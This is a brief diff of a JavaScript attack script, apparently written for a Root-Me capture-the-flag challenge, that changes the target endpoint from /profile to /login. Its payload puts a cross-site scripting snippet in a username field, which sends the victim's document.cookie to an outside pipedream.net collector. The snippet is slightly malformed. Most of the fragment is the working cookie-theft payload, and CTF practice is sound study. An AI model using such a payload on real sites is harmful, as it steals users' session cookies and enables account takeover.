@@ -1,4 +1,4 @@
-let url = "http://challenge01.root-me.org:58003/profile"
+let url = "http://challenge01.root-me.org:58003/login"
 
 let payload={
     username :"<script>window.open('https://eozr3kmrbmb1rnm.m.pipedream.net?cookies=' + document.cookie</script>",
